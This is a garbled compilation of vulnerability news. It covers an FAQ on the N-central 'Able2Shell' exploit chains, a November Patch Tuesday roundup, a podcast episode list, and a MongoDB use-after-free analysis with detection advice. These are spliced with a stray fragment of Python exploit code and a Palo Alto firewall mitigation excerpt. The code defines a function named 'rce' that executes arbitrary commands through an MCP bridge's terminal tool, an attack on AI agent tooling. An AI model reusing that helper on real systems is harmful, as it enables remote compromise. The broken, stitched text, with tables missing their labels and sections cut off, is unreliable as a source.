The researcher describes the XXE chain as credential-free, and N-able's record for CVE-2026-125883 lists no privileges and no user interaction as required. The researcher’s proof-of-concept takes several identifiers as inputs, and other findings in the README describe anonymous ways to obtain some of them. The XXE step has the appliance fetch a file from an attacker-hosted server.For the MMS3 chains, the researcher says an unauthenticated attacker can plant the script, which runs when a logged-in administrator views the poisoned patch details. N-able’s record for CVE-2026-125880 lists high privileges and active user interaction.

How severe is Able2Shell?

Two of the four chains reach root: MMS3 stored XSS to Audit Export, and SIS path traversal to syslog. The XXE chain runs commands as the nable account (uid 992), and the researcher’s proof-of-concept can also create an administrator account. N-able’s CVSSv4 scores for the seven CVEs range from 8.3 to 9.3, and N-able calls Hotfix 2 a critical security update.

Has N-able confirmed the findings?

N-able has published seven CVEs and a hotfix, but it has not mapped its CVEs to the researcher’s 33 findings or commented on them individually. Before the hotfix, N-able said it was responding to the public disclosure of critical vulnerabilities in N-central by an independent security researcher.

Which versions are affected?

N-able's CVE records list N-central versions before 26.4.1 as affected (the record for CVE-2026-91000 writes this as 2026.4.1), and the fixed build is 2026.4.1.26. The researcher says all testing was done on N-central Appliance 2026.4.0.31, which the researcher describes as a pre-release build, and that "most if not all vulnerabilities should work on previous versions."

Is the hosted N-central service affected?

N-able took its hosted N-central environments offline as a precaution after the disclosure, and its status page lists hosted N-central in the Americas, APAC and Europe among the affected services. On November 10, N-able said all hosted N-central servers across all global regions had been upgraded to the new release. Hosted customers still upgrade their own Agents and Probes.

Has Able2Shell been exploited in the wild?

N-able's status page says it is observing “scanning activity associated with the published proof-of-concept code.” Huntress reported N-able’s statement that it had no evidence that any customer environment had been successfully exploited, and said on November 10 that it had not observed evidence of Able2Shell exploitation in its partners’ environments.

Beazley Security Labs updated its November 9 advisory on November 10 with watchTowr’s report of exploitation attempts against its N-central honeypots. Beazley Security Labs says a confirmed compromise of a customer server “has not been reported.”

Previdian reports exploitation attempts against its N-central decoy environment, not confirmed compromise. Its decoys recorded 68 events from one source IP address starting on November 9, including XXE and sensitive-file access attempts. Previdian says these do not show a completed account takeover or command execution, or a full replay of the published chain.

Which threat actors are exploiting Able2Shell?

As of November 10, there are no details available for any threat actor activity connected to Able2Shell exploitation.

Is there a proof-of-concept (PoC) available?

Yes. The researcher’s README includes Python proof-of-concept code for the alleged vulnerabilities, tested against N-central Appliance 2026.4.0.31.

How does this relate to earlier N-central vulnerabilities?

Able2Shell is a newly disclosed set of vulnerabilities, and it is not known whether any relate to earlier N-central flaws. None of the seven CVEs fixed in Hotfix 2 is in CISA’s Known Exploited Vulnerabilities (KEV) catalog as of November 10. Five earlier N-central CVEs are in the KEV catalog:

CVE

Description

Date Added to KEV

CVE-2026-86218

Static code injection

September 8, 2026

CVE-2026-18556

Authentication bypass

August 4, 2026

CVE-2026-18577

Authentication bypass

August 3, 2026

CVE-2025-8876

Command injection

August 13, 2025

CVE-2025-8875

Insecure deserialization

August 13, 2025

Are patches or mitigations available?

Yes. On November 10, N-able released N-central 2026.4 Hotfix 2 (build 2026.4.1.26), which fixes the seven CVEs above. According to N-able, on-premises customers upgrade their own servers, while N-able upgrades hosted servers. All customers also upgrade their Agents and Probes, Agents first, because an upgraded Probe cannot communicate with Agents that have not been upgraded. Until an on-premises server is upgraded, N-able recommends keeping it offline. A follow-up hotfix with further security updates is also planned. Hotfix 2 removes legacy mobile device management (MDM). The release notes list N-central’s built-in remote control as temporarily disabled, while Take Control continues to work.Are there indicators of compromise?

Yes. Beazley Security Labs and Previdian have published network indicators tied to exploitation attempts, including source IP addresses and the SOAP endpoints targeted. Huntress recommends reviewing login and authentication activity from November 8 onward, and watching for anomalous remote access sessions, newly deployed scripts and unauthorized new administrator accounts.

Has Tenable released product coverage?

A list of Tenable plugins for these vulnerabilities can be found on the individual CVE pages:

CVE-2026-125883

CVE-2026-125881

CVE-2026-125878

CVE-2026-125879

CVE-2026-125882

CVE-2026-91000

CVE-2026-125880

This list may contain plugins released after this blog’s publication.

Has Tenable classified any of these vulnerabilities under Vulnerability Watch?

Yes. Tenable has classified CVE-2026-125883 as a Vulnerability of Interest (VOI) under Vulnerability Watch. CVE-2026-125878, CVE-2026-125881 and CVE-2026-125882 are each classified as a Vulnerability Being Monitored (VBM).

Get more information

Able2Shell write-up (Oracle-Security on GitHub)

N-central 2026.4 HF2 Release Notes

Previdian: N-able N-central critical vulnerabilities, what we know so far

Huntress: N-able Disables Cloud Services Following Disclosure of "Able2Shell" Exploit Chains

Vulnerabilities & Patching.title: November 2026 Patch Tuesday: 63 Critical Microsoft fixes, plus an Outlook zero day that allows theft of hashed credentials
Vulnerabilities & Patching.context: A currently exploited zero-day vulnerability that can let attackers steal hashed Outlook NTLM credentials is among the 1,094 holes Microsoft fixed in its November Patch Tuesday...
Vulnerabilities & Patching.full_text:
A currently exploited zero-day vulnerability that can let attackers steal hashed Outlook NTLM credentials is among the 1,094 holes Microsoft fixed in its November Patch Tuesday releases.

Although rated as only moderate in severity, with a CVSS score of 6.5, Windows administrators need to address CVE-2026-124194 immediately because threat actors are already attacking it. “Don’t let the low score fool you,” said Nick Carroll, cyber incident response manager at Nightwing.

Affected products include Microsoft 365 Apps for Enterprise, and Office LTSC 2021 and 2024. However, since the user has to open a malicious Office file to launch the attack, good employee cybersecurity awareness training and an effective email gateway could mitigate this attack until the patch is installed.

Opening the malicious file could cause Outlook to connect to an attacker-controlled network location without displaying the usual external-content warning, potentially disclosing authentication information that could be used to impersonate the user. The vulnerability discloses a user’s NTLMv2 password hash to the attacker, who may be able to relay it to other systems to sign in as the user, or crack it to recover the password.

Microsoft, which has been using its AI model to find thousands of vulnerabilities in its products since the summer, credited an Anthropic researcher using the Claude AI assistant for finding the Outlook vulnerability. That led Satyam Narang, senior staff researcher at Tenable, to comment, “for most of the year, AI has been building bigger haystacks across Patch Tuesday releases, and this appears to be the first time it has found a needle.”

Separately, SAP plugged a critical memory corruption vulnerability dubbed ICM2Shell, with a CVSS rating of 10. Discovered by researchers at Onapsis, the vulnerability impacts the way the SAP Kernel handles WebSocket traffic. Onapsis said that a specially crafted sequence of WebSocket messages could either crash a process or allow an attacker to run code remotely. Affected are SAP Internet Communications Manager (ICM), which is inside the kernel, and SAP Web Dispatcher, a reverse proxy many organizations place at the edge of their network.

Microsoft patches

Of the 1,094 Microsoft vulnerabilities, 63 were rated as critical.

Four flaws carry a CVSS severity score of 9.8, noted Jack Bicer, director of vulnerability research at Action1, and three of them need no credentials and no user action to exploit. The Windows LDAP Remote Code Execution Vulnerability (CVE-2026-119958) lets an unauthenticated attacker run code inside the Windows LDAP service, which puts domain controllers and the whole Active Directory environment at risk.

The Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2026-118207) can be triggered by anyone able to send email to the organization, Bicer said, and the Windows Xbox Live Networking Service Remote Code Execution Vulnerability (CVE-2026-112967) gives an attacker on the same network full control of a Windows system.

The fourth, the Azure OpenAI Elevation of Privilege Vulnerability (CVE-2026-119990), sits in a cloud service many teams now depend on. However, this service is automatically patched by Microsoft.

Patch order should follow reach, not product names, Bicer advised CSOs. Domain controllers and Exchange servers go first, he said, followed by anything that exposes IIS, Microsoft Secure Channel (Schannel) or RPC to untrusted networks.

Message Queuing deserves an inventory before it gets a patch: find every server where the service is enabled, turn it off where no application needs it, and patch the rest the same day, he said, adding that hypervisor hosts need their own maintenance window, because one escaped guest becomes a problem for every tenant on that host.

“What defenders need to know and do right now is abandon broad triage and take immediate defensive action,” said Dustin Childs, head of threat awareness at TrendAI’s Zero Day Initiative. That means first patching Exchange and domain controllers (meaning LDAP/Kerberos) to stop zero-click compromise, ring-fence exposed network services like DNS and DHCP to prevent wormable spread, and verify manual administrative fixes on cloud services your organization uses.

Tyler Reguly, associate director of security R&D at Fortra, observed that there are fewer Microsoft vulnerabilities this month than there were in October, but noted, “I’m not foolish enough to think that this single drop indicates that we’re into the downward trend that I predicted we’ll see in the coming months. Instead, I think that we’re seeing a continuation of the elevated numbers as Microsoft continues to fix long hidden issues that are being surfaced by AI. Soon, however, these numbers will begin to decline as the last of these long-hidden issues are resolved and we only have new bugs to deal with.”

CSOs can help their teams by ignoring any noise coming from vendors and any vulnerabilities that are overhyped, Reguly said. When vulnerability counts started to rise, it was C-level employees who jumped up the fastest and added to the burden their admins were facing. “Now it’s time to settle down and support your teams rather than increasing their burden. CSOs should keep in mind that AI companies and security vendors may needlessly hype unimportant vulnerabilities because it is cheap, effective marketing for their services,” he pointed out. “A vulnerability isn’t critical if you don’t have the impacted software deployed.”

Prevention is key, so CSOs should focus their efforts on system hardening and mitigation. This, he said, will be more effective than chasing vulnerabilities. Finally, Reguly reminded CSOs that prioritization matters. “If you’ve developed a prioritization strategy that works for you, don’t change your process just because the media is looking for clicks,” he said.

SAP patches

The critical vulnerabilities collectively known as ICM2Shell are CVE-2026-76964 and CVE-2026-89126. Researchers at Onapsis, who discovered them, said exploitation isn’t theoretical; they provided SAP with a working exploit that achieves full, unauthenticated remote code execution end to end, running arbitrary commands as adm on the target system. The denial-of-service condition, in turn, reproduced on every SAP Kernel release tested.

To access the flaw, an attacker only needs network access to the HTTP/HTTPS port, says Onapsis. Because WebSocket support is enabled by default in both the ICM and the SAP Web Dispatcher, a system is exposed even if no application uses WebSocket. Some services, including default ICF services in SAP S/4HANA, accept WebSocket connections without authentication, and in others the flaw can be reached before authentication takes place. “Nothing in the chain requires an SAP user, a password or a certificate,” the researchers said.

The adm account owns the SAP installation, the researchers pointed out, including its executables, its instance profiles, its secure store, and its connection to the database. Running commands as that user grants full control of the SAP system. An attacker could, among other things recover database credentials and other secrets from the secure store and profiles and use them to read or alter any business data directly in the database; collect RFC destinations and technical credentials that let them move on to the SAP and non-SAP systems connected to this one; change configuration or binaries to keep persistent access; and destroy data.

Other patches

Chris Goettl, VP of product management at Ivanti, drew attention to patches from Adobe, Mozilla and Google.

Adobe released nine security bulletins that resolve 110 CVEs, 22 of which are critical. Adobe said it is not aware of any exploits in the wild. The two Priority 2 updates carry the most risk; Connect (APSB26-191) has the largest count at 24 CVEs, 18 of them critical and six rated CVSS 10.0. The vulnerabilities span SSRF, path traversal and SQL injection, and affect Windows on-prem versions 12.12 and earlier. The Experience Manager (APSB26-189) patch fixes 14 CVEs, including four Critical code execution flaws rated CVSS 9.9.

Google Chrome 157.0.8103.50, released on Monday, resolved nine CVEs including CVE-2026-125350, which is being actively exploited in the wild. This marks Chrome’s eighth zero-day exploit of 2026, Goettl noted. Chromium-based browsers such as Microsoft Edge will need the fix as well, and users should relaunch after updating for the patch to take effect. This patched release follows Chrome 157’s November 3 release, which fixed 213 vulnerabilities, seven of them critical. Separately, Google’s November Android bulletin fixed 216 vulnerabilities, 23 of them critical, with none marked as exploited. The target is patch level is 2026-11-05 or later.

Mozilla’s November 10 release includes Firefox 160, which resolves 99 CVEs (57 of them are ranked High). Firefox ESR 153.7 resolves 81 vulnerabilities. (51 High), and ESR 115.45 resolves 28, all High. Many of the High-rated issues are use-after-free and memory boundary flaws across graphics, DOM, layout, and JavaScript components, including a number of sandbox escapes such as CVE-2026-124907, a use-after-free in CanvasWebGL that allows privilege escalation and sandbox escape. The same flaw is addressed in Thunderbird 160 and Thunderbird 153.7.

Vulnerabilities & Patching.full_text:
Category: Help & How To

From hacked French refrigerators igniting fires to a massive OpenSSH authentication bug hiding in plain sight for a decade, this week’s stories expose how lapses in basic security ripple into chaos—and why AI is now both a weapon and shield.

TA surprising announcement regarding SpinRite.

What is being "AI-pilled" and how does it happen.

OpenAI just released GPT-6 Cyber. What does that mean.

An irresponsible hacker published 30+ N-Able 0-days.

700 French refrigerators hacked. What's next.

Lots of listener feedback about the Cloudflare tunneling solution, Voyager 1, true hardware drive encryption, the random number 4 and the amount of debris in orbit

Then we look at a 10-year old serious SSH authentication bug (that's kinda wonderful)

Vulnerabilities & Patching.title: CVE-2026-118383: Use-after-free vulnerability in MongoDB
Vulnerabilities & Patching.context: Remote unauthenticated exploitation is possible, but only during a specific window that the attacker does not have visibility into
Vulnerabilities & Patching.full_text:
Key points and observations

CVE-2026-118383 is a critical use-after-free in MongoDB Server's primary catch-up process, with a CVSS v4.0 score of 9.5. It affects replica set members, including those used by shards and config servers. Standalone mongod instances are unaffected.

Remote unauthenticated exploitation is possible, but only during a specific window that the attacker does not have visibility into.

We reproduced a crash (segmentation fault) on MongoDB Server 8.0.34.

An unauthenticated client can set up the crash with two ping requests, because vulnerable servers accept ping before login. Turning on authentication does not prevent this.

Upgrade every affected replica set member to a fixed release. Restricting network access can reduce exposure while you upgrade.

What happened

MongoDB announced a security update on November 10. The company said it found the vulnerability internally and was not aware of exploitation attempts at the time of its announcement. The advisory describes a use-after-free when a newly elected replica set primary completes catch-up. During catch-up, the member applies operations it missed before accepting writes as primary.

The vulnerability affects ordinary replica set members. It also affects the replica set members used by shards and config servers in sharded clusters. A standalone mongod does not perform replica set primary catch-up and is not affected by this vulnerability. The advisory rates the issue Critical and says the server may terminate unexpectedly or, under certain conditions, execute arbitrary code in the server process.

How to know if you are affected

The issue affects replica set members, including shard and config server replica set members in sharded clusters. Standalone mongod instances are not affected.

The MongoDB fix releases are:

MongoDB Server branch

First fixed release

9.0

9.0.7

8.3

8.3.16

8.0

8.0.37

7.0

7.0.48

6.0

6.0.30

5.0

5.0.35

4.4

4.4.32

Upgrade to the fixed release for your branch, or use a distributor package that includes the fix. Verify the version running on every member after the upgrade, including members in containers and any members that were offline during maintenance. MongoDB says Atlas clusters are upgraded automatically during maintenance. It urges customers who defer maintenance to apply the upgrade promptly.

Until you can upgrade, restrict network access to MongoDB to the specific systems that need access to it. This limits who can send the unauthenticated requests, but it does not fix the use-after-free.

Exploitation window and likelihood

When a replica set member wins an election, it first catches up on writes it missed, then starts accepting new ones. The bug is in the cleanup at the end of that catch-up step. Before any election happens, an attacker can leave two stale “waiters” on a member. A waiter is a pending notification MongoDB creates when a request asks to wait until replication reaches a certain point. Planting them does not crash the server by itself. The diagram below traces an election timeline and marks where the crash fires.

Plant during steady state: The attacker sends two unauthenticated ping requests that include a readConcern.afterOpTime value to a reachable, vulnerable replica set member. The waiters don't expire. They stay in place until the member restarts, rolls back, or steps down from primary.

Reach catch-up: Later, the same member has to win an election while it is behind another member. The attacker can't cause the lag or the election. Both have to happen on their own, for example during maintenance or an outage.

Crash when catch-up ends: When catch-up finishes, the new primary runs its cleanup twice, uses memory it has already freed, and crashes before it accepts any writes. Once the first two steps are in place, the crash does not depend on winning a timing race.

We created the lag and the failover ourselves, so the roughly 40 seconds our lab run took is not an estimate of how quickly a real attack would work. After the crash, our test cluster had no primary. Another deployment might elect a new primary and keep running.

What we reproduced

We built a four-member replica set from MongoDB's official Linux x86_64 binaries and created the two conditions an attacker can't control: one member falling behind on replication, and a failover that makes that member the new primary. Setting this up took admin access to the lab, to pause and stop mongod processes and to write data with an authenticated client. The attacker's part, the two ping requests, used no credentials, and we confirmed that the same unauthenticated client could not write to the database.

We ran the same failover three times, changing only the MongoDB version and whether we sent the two requests:

Run

Observed result

Both timed out after about 1.5 seconds with MaxTimeMSExpired

The target member exited catch-up twice, logged SIGSEGV, and the mongod process crashed

B

The target member exited catch-up once, became writable, and remained running through the observation window

C

The target member exited catch-up once, became writable, and remained running through the observation window

The video below shows run A from start to finish: the two unauthenticated requests, the failover we triggered, and the new primary crashing.

Your browser does not support the video tag.

In run A, MongoDB's log shows the new primary leaving catch-up mode twice within the same millisecond, followed by “Invalid access at address: 0” and “Got signal: 11 (Segmentation fault).” The backtrace points to CatchupState::abort_inlock(). Runs B and C went through the same failover, logged a single catch-up exit, and kept running.

Run C shows that the patched server refuses the requests. It does not test the other half of MongoDB's fix, which stops the double cleanup even when waiters are already in place; MongoDB's own regression tests cover that case. Our results show that the crash can be set up without credentials in this lab setup. They don't tell us how often it would succeed in other topologies, and we did not achieve code execution.

How to detect exploitation attempts

Start with MongoDB's structured server logs. In our vulnerable run, each planted request appeared as a COMMAND “Slow query” event (ID 51803). The useful fields were:

attr.command.ping

attr.command.readConcern.afterOpTime

attr.command.maxTimeMS

attr.errName (MaxTimeMSExpired)

attr.durationMillis

attr.remote

Look for an unauthenticated command with unusual operation-time values and an expired wait.

Also check the logs for the sequence that preceded a crash: a member enters primary catch-up (ID 21359), exits catch-up twice (ID 21363) in one transition, and then logs a fatal signal or backtrace involving CatchupState::abort_inlock(). A normal election or a single catch-up exit does not identify this CVE. The requests may arrive before the failover. Review earlier logs from the same member, not just events around the crash.

Whether these request fields appear in the logs depends on your logging settings. MongoDB documents that client operations enter the diagnostic log when they exceed the slow-operation threshold or when command verbosity is at least one. Check whether your logs retain the command object. Slow-operation sampling or a log pipeline may drop it. The attr.remote field may contain a loopback address rather than the original client IP.

How Datadog can help

Datadog Cloud Security Management reports findings for CVE-2026-118383. Check the vulnerability findings for affected hosts and container images.

Datadog Cloud Security Management also flags security groups that allow inbound MongoDB access from the internet, through the rule Inbound MongoDB access should be restricted. Use it to find exposed replica set members to patch first. Datadog Cloud SIEM detections for CVE-2026-118383 are currently being evaluated, and we will update this post when they are available.

Conclusion

CVE-2026-118383 affects MongoDB replica set members when a newly elected primary finishes catch-up. We reproduced a crash after two unauthenticated requests left abandoned waiters. The patched release rejected those requests. The vendor also identifies arbitrary code execution as a possible impact under certain conditions; our tests did not demonstrate it. Upgrade every affected member to a fixed release, verify the running versions, and investigate unusual readConcern.afterOpTime requests alongside catch-up and crash events.

--------------------------------------------------------------------------- # Helpers # --------------------------------------------------------------------------- def mcp_call(target, endpoint, method, params=None): """Send a JSON-RPC 2.0 request to the MCP bridge.""" url = f"http://{target}:{MCP_PORT}{endpoint}" payload = json.dumps({ "jsonrpc": "2.0", "id": 1, "method": method, "params": params or {} }).encode() req = urllib.request.Request( url, data=payload, headers={ "Content-Type": "application/json", "Accept": "application/json, text/event-stream", }, method="POST" ) try: with urllib.request.urlopen(req, timeout=TIMEOUT) as resp: return json.loads(resp.read().decode()) except urllib.error.URLError as e: fail(f"Request to {url} failed: {e}") def rce(target, command): """Execute a command via ruflo__terminal_execute.""" resp = mcp_call(target, "/mcp/devtools", "tools/call", { "name": "ruflo__terminal_execute", "arguments": {"command": command} }) try: # The bridge returns JSON inside a text field inside JSON # Outer: resp["result"]["content"][0]["text"] -> JSON string # Inner: that JSON string has another "content" array outer_text = resp["result"]["content"][0]["text"] middle = json.loads(outer_text) # middle is {"content": [{"type": "text", "text": "{...}"}]} inner_text = middle["content"][0]["text"] inner = json.loads(inner_text) return inner.get("output", "").strip() except Exception: # Fallback: return whatever we got as string return str(resp) def get_local_ip(): """Get the local IP that can reach the target.""" s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) try: s.connect(("8.8.8.8", 80)) return s.getsockname()[0] finally: s.close() # Cloud NGFW and Prisma Access are not impacted by this vulnerability.

Recommended mitigation—The vast majority of firewalls already follow Palo Alto Networks and industry best practices. However, if you haven’t already, we strongly recommend that you secure access to your management interface according to our best practice deployment guidelines. Specifically, you should restrict access to the management interface to only trusted internal IP addresses to prevent external access from the internet.

Additionally, if you have a Threat Prevention subscription, you can block these attacks using Threat IDs 95746, 95747, 95752, 95753, 95759, and 95763 (available in Applications and Threats content version 8915-9075 and later). For these Threat IDs to protect against attacks for this vulnerability,

  • Ensure that all the listed Threat IDs are set to block mode,
  • Route incoming traffic for the MGT port through a DP port, e.g., enabling management profile on a DP interface for management access,
  • Replace the Certificate for Inbound Traffic Management,
  • Decrypt inbound traffic to the management interface so the firewall can inspect it, and
  • Enable threat prevention on the inbound traffic to management services.
Review information about how to secure management access to your Palo Alto Networks firewalls:

For these Threat IDs to protect against attacks for this vulnerability, * Ensure that all the listed Threat IDs are set to block mode, * Route incoming traffic for the MGT port through a DP port https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#id59206398-3dab-4b2f-9b4b-7ea500d036ba , e.g., enabling management profile on a DP interface for management access, * Replace the Certificate for Inbound Traffic Management https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#id112f7714-8995-4496-bbf9-781e63dec71c , * Decrypt inbound traffic to the management interface so the firewall can inspect it https://docs.paloaltonetworks.com/best-practices/10-1/administrative-access-best-practices/administrative-access-best-practices/deploy-administrative-access-best-practices#idbbd82587-17a2-42b4-9245-d3714e1e13a2 , and * Enable threat prevention on the inbound traffic to management services.
